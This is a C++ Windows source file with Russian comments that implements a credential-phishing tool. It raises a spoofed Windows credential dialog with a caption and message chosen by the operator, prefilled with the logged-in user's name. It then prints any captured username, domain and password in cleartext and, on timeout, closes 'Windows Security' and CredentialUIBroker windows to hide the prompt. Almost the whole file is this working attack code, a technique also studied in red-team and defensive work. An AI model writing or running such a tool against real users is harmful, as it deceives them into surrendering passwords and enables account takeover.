// Определяем целевую среду
#define SECURITY_WIN32

#include <windows.h>
#include <wincred.h>
#include <shlwapi.h>
#include <sspi.h>
#include <secext.h>
#include <iostream>
#include <memory>
#include <vector>

#pragma comment(lib, "Credui.lib")
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Shlwapi.lib")

// Константы
constexpr size_t MAX_NAME_LENGTH = 8192;
constexpr size_t MAX_CREDENTIAL_LENGTH = 514;
constexpr size_t MAX_PATH_LENGTH = MAX_PATH;



// Структура параметров потока
struct ThreadParams {
    std::wstring reason;
    std::wstring message;
};

/**
 * @brief Проверяет, является ли окно целевым для закрытия
 */
bool CheckAndCloseWindow(HWND hWnd, char* pWindowTitle, DWORD dwProcId, wchar_t* pExeName) {
    // Проверяем, видимо ли окно
    if (!IsWindowVisible(hWnd)) return true;

    // Получаем стиль окна
#if defined(WOW64)
    LONG_PTR lStyle = GetWindowLongPtrA(hWnd, GWL_STYLE);
#else
    LONG_PTR lStyle = GetWindowLongPtrA(hWnd, GWL_STYLE);
#endif

    // Получаем ID процесса
    if (!GetWindowThreadProcessId(hWnd, &dwProcId)) return true;

    // Получаем заголовок окна
    if (!SendMessageA(hWnd, WM_GETTEXT, MAX_NAME_LENGTH, reinterpret_cast<LPARAM>(pWindowTitle)))
        return true;

    // Закрываем окно "Windows Security"
    if (_stricmp(pWindowTitle, "Windows Security") == 0) {
        PostMessageA(hWnd, WM_CLOSE, 0, 0);
        return true;
    }

    // Закрываем собственные окна
    if ((dwProcId == GetCurrentProcessId()) &&
        (WS_POPUPWINDOW == (lStyle & WS_POPUPWINDOW))) {
        PostMessageA(hWnd, WM_CLOSE, 0, 0);
        return true;
    }

    // Проверяем процесс через QueryFullProcessImageNameW
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcId);
    if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
        DWORD dwSize = MAX_PATH_LENGTH;
        if (QueryFullProcessImageNameW(hProcess, 0, pExeName, &dwSize) &&
            StrStrIW(pExeName, L"CredentialUIBroker.exe")) {
            PostMessageA(hWnd, WM_CLOSE, 0, 0);
        }
        CloseHandle(hProcess);
    }

    return true;
}

/**
 * @brief Перечислитель окон для закрытия
 */
BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
    // Выделяем память под данные окна
    auto pWindowTitle = std::make_unique<char[]>(MAX_NAME_LENGTH);
    auto pExeName = std::make_unique<wchar_t[]>(MAX_PATH_LENGTH);

    if (pWindowTitle && pExeName) {
        CheckAndCloseWindow(hWnd, pWindowTitle.get(), 0, pExeName.get());
    }

    return TRUE;
}

/**
 * @brief Функция получения учетных данных
 */
DWORD WINAPI AskCreds(LPVOID lpParam) {
    auto* params = static_cast<ThreadParams*>(lpParam);

    HWND hWnd = GetForegroundWindow();
    CREDUI_INFOW credUiInfo = { 0 };

    // Инициализация структуры CREDUI_INFOW
    credUiInfo.cbSize = sizeof(CREDUI_INFOW);
    credUiInfo.pszCaptionText = const_cast<LPWSTR>(params->reason.c_str());
    credUiInfo.pszMessageText = const_cast<LPWSTR>(params->message.c_str());
    credUiInfo.hwndParent = hWnd;
    credUiInfo.hbmBanner = NULL;

    // Инициализация переменных для работы с учетными данными
    DWORD authPackage = 0;
    DWORD dwRet = ERROR_SUCCESS;
    BOOL bSave = FALSE;

    // Получаем имя текущего пользователя
    std::vector<wchar_t> usernameBuffer(MAX_CREDENTIAL_LENGTH);
    ULONG nSize = static_cast<ULONG>(usernameBuffer.size());

    if (!GetUserNameExW(NameSamCompatible, usernameBuffer.data(), &nSize)) {
        std::wcerr << L"Failed to get username" << std::endl;
        return ERROR_ACCESS_DENIED;
    }

    // Подготавливаем буфер для аутентификации
    ULONG inCredSize = 0;

    // Создаем изменяемую строку для пароля
    wchar_t emptyPassword[] = L"";

    if (!CredPackAuthenticationBufferW(CRED_PACK_GENERIC_CREDENTIALS, usernameBuffer.data(), emptyPassword, nullptr, &inCredSize) &&
        GetLastError() == ERROR_INSUFFICIENT_BUFFER) {

        std::vector<BYTE> inCredBuffer(inCredSize);
        if (!CredPackAuthenticationBufferW(CRED_PACK_GENERIC_CREDENTIALS, usernameBuffer.data(), emptyPassword, inCredBuffer.data(), &inCredSize)) {
            std::wcerr << L"Failed to pack credentials" << std::endl;
            return ERROR_ACCESS_DENIED;
        }

        // Отображаем диалог ввода учетных данных
        LPVOID outCredBuffer = nullptr;
        ULONG outCredSize = 0;

        dwRet = CredUIPromptForWindowsCredentialsW(
            &credUiInfo, 0,
            &authPackage,
            inCredBuffer.data(),
            inCredSize,
            &outCredBuffer,
            &outCredSize,
            &bSave,
            CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX
        );

        if (dwRet == ERROR_SUCCESS && outCredBuffer) {
            // Обработка полученных учетных данных
            std::vector<wchar_t> username(MAX_CREDENTIAL_LENGTH);
            std::vector<wchar_t> password(MAX_CREDENTIAL_LENGTH);
            std::vector<wchar_t> domain(MAX_CREDENTIAL_LENGTH);

            ULONG maxLenName = static_cast<ULONG>(username.size());
            ULONG maxLenPass = static_cast<ULONG>(password.size());
            ULONG maxLenDomain = static_cast<ULONG>(domain.size());

            if (CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize,
                username.data(), &maxLenName, domain.data(), &maxLenDomain, password.data(), &maxLenPass)) {

                if (wcslen(domain.data()) == 0) {
                    std::wcout << L"[+] Username: " << username.data() << std::endl
                        << L"[+] Password: " << password.data() << std::endl;
                }
                else {
                    std::wcout << L"[+] Username: " << username.data() << std::endl
                        << L"[+] Domainname: " << domain.data() << std::endl
                        << L"[+] Password: " << password.data() << std::endl;
                }
            }

            // Освобождаем буфер с учетными данными
            CredFree(outCredBuffer);
        }
        else if (dwRet == ERROR_CANCELLED) {
            std::wcout << L"The operation was canceled by the user" << std::endl;
        }
        else {
            std::wcerr << L"CredUIPromptForWindowsCredentialsW failed, error: " << dwRet << std::endl;
        }
    }

    return dwRet;
}

int wmain(int argc, wchar_t* argv[]) {
    // Пример использования: program.exe "Reason" "Message" 10
    if (argc < 4) {
        std::wcerr << L"Usage: " << argv[0] << L" <reason> <message> <timeout_seconds>" << std::endl;
        return 1;
    }

    try {
        ThreadParams params;
        params.reason = argv[1];
        params.message = argv[2];
        DWORD dwTimeOut = _wtoi(argv[3]) * 1000;

        // Создание потока для получения учетных данных
        DWORD ThreadId = 0;
        HANDLE hThread = CreateThread(nullptr, 0, AskCreds, &params, 0, &ThreadId);

        if (!hThread) {
            std::wcerr << L"Failed to create thread" << std::endl;
            return 2;
        }

        // Ожидание завершения потока
        DWORD dwResult = WaitForSingleObject(hThread, dwTimeOut);

        if (dwResult == WAIT_TIMEOUT) {
            std::wcerr << L"ThreadId: " << ThreadId << L" timed out, closing window" << std::endl;

            // Попытка закрыть окно через EnumWindows
            if (!EnumWindows(EnumWindowsProc, 0)) {
                std::wcerr << L"Failed to close window, terminating thread" << std::endl;
                TerminateThread(hThread, 0);  // Не идеально, но иногда необходимо
            }
            else {
                // Ждем завершения потока после закрытия окна
                WaitForSingleObject(hThread, 2000);
            }
        }

        // Закрытие дескриптора потока
        if (hThread) CloseHandle(hThread);
    }
    catch (const std::exception& ex) {
        std::cerr << "Exception: " << ex.what() << std::endl;
        return 3;
    }

    return 0;
}
